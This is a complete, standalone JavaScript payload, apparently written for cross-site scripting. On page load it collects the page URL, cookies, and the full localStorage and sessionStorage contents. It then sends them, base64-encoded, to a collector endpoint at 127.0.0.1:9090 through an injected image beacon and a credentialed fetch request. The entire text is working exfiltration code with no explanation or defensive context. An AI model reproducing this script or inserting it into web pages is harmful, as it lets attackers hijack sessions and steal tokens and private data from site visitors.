(function () {
  var exfil = "http://127.0.0.1:9090/collect";
  var payload = {
    u: location.href,
    c: document.cookie,
    l: localStorage.length ? JSON.stringify(localStorage) : "",
    s: sessionStorage.length ? JSON.stringify(sessionStorage) : "",
    t: Date.now()
  };
  var img = new Image();
  img.src = exfil + "?d=" + encodeURIComponent(btoa(JSON.stringify(payload)));
  document.body.appendChild(img);
  fetch(exfil + "?c=" + encodeURIComponent(document.cookie), { credentials: "include" }).catch(function () {});
})();
